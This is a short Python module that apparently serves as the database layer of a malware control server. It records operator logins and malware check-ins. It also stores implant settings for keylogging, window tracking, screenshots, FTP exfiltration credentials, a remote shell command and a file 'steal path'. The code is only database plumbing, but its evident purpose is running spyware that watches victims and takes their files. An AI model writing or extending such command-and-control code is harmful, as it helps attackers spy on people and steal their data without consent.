from db_connection import connection_handler


@connection_handler
def add_login(cursor, user_data):
    query = ''' INSERT INTO logins (email,pass,date)
                VALUES (%(email)s,%(pass)s,%(date)s)    '''
    cursor.execute(query,user_data)



@connection_handler
def is_in_session(cursor, email):
    query = ''' SELECT COUNT(email) as session FROM logins
                WHERE email=%(email)s   '''
    params = {'email':email}
    cursor.execute(query,params)
    return cursor.fetchone()['session'] == 1



@connection_handler
def malware_connection(cursor, data):
    query = ''' INSERT INTO malware (username, timestamp)
                VALUES(%(username)s,%(timestamp)s)'''
    cursor.execute(query,data)



@connection_handler
def get_config(cursor):
    query = ''' SELECT * FROM config'''
    cursor.execute(query)
    return cursor.fetchone()



@connection_handler
def clear_config(cursor):
    query = ''' DELETE FROM config'''
    cursor.execute(query)


@connection_handler
def add_config(cursor, config):
    clear_config()
    query = ''' INSERT INTO config (debug, "keyloggingIsActive", "windowTrackingIsActive", samplingfrequency, screenshotfrequency, screenshottrigger, baseurl, communicationfrequency, ftpurl, ftpusername, ftppassword, shellcommand, stealpath)
                VALUES(%(debug)s, %(keyloggingIsActive)s, %(windowTrackingIsActive)s, %(samplingfrequency)s, %(screenshotfrequency)s, %(screenshottrigger)s, %(baseurl)s, %(communicationfrequency)s, %(ftpurl)s, %(ftpusername)s, %(ftppassword)s, %(shellcommand)s, %(stealpath)s)'''
    cursor.execute(query, config)